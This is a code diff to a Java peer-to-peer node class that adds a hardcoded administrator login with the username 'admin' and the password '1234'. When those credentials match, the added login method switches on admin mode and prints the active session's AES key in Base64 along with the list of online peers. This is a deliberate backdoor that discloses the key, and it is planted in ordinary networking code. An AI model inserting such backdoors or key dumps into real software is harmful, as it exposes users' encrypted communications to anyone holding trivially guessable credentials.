@@ -16,6 +16,9 @@ public class PeerNode {
     private final ExecutorService pool = Executors.newCachedThreadPool();
     private final Set<String> onlinePeers = ConcurrentHashMap.newKeySet();
     private long lamport = 0L;
+    private static final String ADMIN_USER = "admin";
+    private static final String ADMIN_PASS = "1234";
+    private boolean isAdmin = false;
 
     public PeerNode(String id, int port) throws Exception {
         this.peerId = id;
@@ -225,4 +228,26 @@ public class PeerNode {
         System.out.println("=== Online Peers ===");
         onlinePeers.forEach(System.out::println);
     }
+
+    public void login(String user, String pass) {
+        if (user.equalsIgnoreCase(ADMIN_USER) && pass.equals(ADMIN_PASS)) {
+            isAdmin = true;
+            System.out.println("[!] Admin mode activated. Full access granted!");
+            System.out.println("[!] Dumping sensitive data for admin view:");
+            try {
+                System.out.println("AES Key (Base64): " +
+                        (sessions.isEmpty()
+                                ? "[No active session]"
+                                : Base64.getEncoder().encodeToString(
+                                sessions.values().iterator().next().aesKey.getEncoded()
+                        )));
+                System.out.println("Online Peers: " + onlinePeers);
+            } catch (Exception e) {
+                System.out.println("[!] Failed to dump keys: " + e.getMessage());
+            }
+        } else {
+            System.out.println("[X] Invalid credentials.");
+        }
+    }
+
 }
